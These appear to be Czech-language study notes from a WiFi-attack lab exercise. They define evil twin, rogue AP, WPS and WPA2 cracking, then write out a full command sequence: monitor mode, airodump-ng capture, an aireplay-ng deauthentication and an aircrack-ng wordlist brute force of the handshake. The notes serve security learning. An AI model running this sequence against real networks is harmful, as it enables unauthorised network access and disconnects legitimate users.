# Day 11 - WiFi attacks

SSID = název wifi

PSK (preshared key) = heslo

BSSID = MAC\


**Evil Twin attack** = škodlivá wifi s téměř podobným SSID

**Rogue AP** = škodlivá WiFi poblíž organizace bez hesla

**WPS attack** = odchycení WPS handshaku obsahující údaje o PINu

**WPA/WPA2 cracking** = základem de-autentizace (odpojení od sítě) a odchycení 4 way handshaku při opětovném \


```shell-session
glitch@wifi:~$ iw dev #vypíše bezdrátové síťové karty
glitch@wifi:~$ sudo iw dev wlan2 scan #scan okolních wifi sítí
```

RSN (Robust Security Network) = indikace přítomnosti WPA2

```shell-session
glitch@wifi:~$ sudo ip link set dev wlan2 down
glitch@wifi:~$ sudo iw dev wlan2 set type monitor
glitch@wifi:~$ sudo ip link set dev wlan2 up
```

Nastaví monitoring&#x20;

```shell-session
glitch@wifi:~$ sudo airodump-ng wlan2 #zapne odchyt, vrátí informace o tom na jakém kanálu naslouchá SSID

```

```shell-session
glitch@wifi:~$ sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
```

Vráti informaci o připojených stanicích (-c KANÁL)&#x20;

```shell-session
glitch@wifi:~$ sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
```

V druhém terminálu pošleme deauth na připojenou stanici (-0 = deauth, 1 počet deauth, -a BSSID AP, \
-c DEAUTH BSSID)

```shell-session
glitch@wifi:~$ sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
```

Po odchycení handshake bruteforce (-a WPA2, -b BSSID AP, -w wordlist)

```shell-session
glitch@wifi:~$ wpa_passphrase MalwareM_AP 'ENTER PSK HERE' > config
glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2
```

Připojení
